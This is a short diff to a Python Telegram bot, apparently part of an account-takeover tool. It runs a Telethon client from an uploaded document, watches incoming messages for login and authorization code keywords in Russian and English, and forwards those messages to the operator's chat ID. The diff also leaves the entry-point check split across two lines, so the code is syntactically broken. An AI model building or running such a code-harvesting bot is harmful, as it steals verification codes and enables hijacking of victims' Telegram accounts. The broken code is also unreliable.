@@ -51,20 +51,19 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
         async def catch_codes(event):
             text = event.raw_text.lower()
             if any(w in text for w in ["код", "code", "авторизац", "вход", "login"]):
-                await context.bot.send_message(
-                    chat_id=MY_ID,
-                    text=f"Код:\n{event.raw_text}"
-                )
+                await context.bot.send_message(chat_id=MY_ID, text=f"Код:\n{event.raw_text}")
 
         asyncio.create_task(client.run_until_disconnected())
 
     except Exception as e:
         await msg.edit_text(f"Ошибка: {e}")
 
-app = Application.builder().token(BOT_TOKEN).build()
-app.add_handler(CommandHandler("start", start))
-app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
+def main():
+    app = Application.builder().token(BOT_TOKEN).build()
+    app.add_handler(CommandHandler("start", start))
+    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
+    app.run_polling()
 
-if __name__ == "__main__":
-    app.
-    run_polling()
+if __name__ == "__main__
+":
+    main()
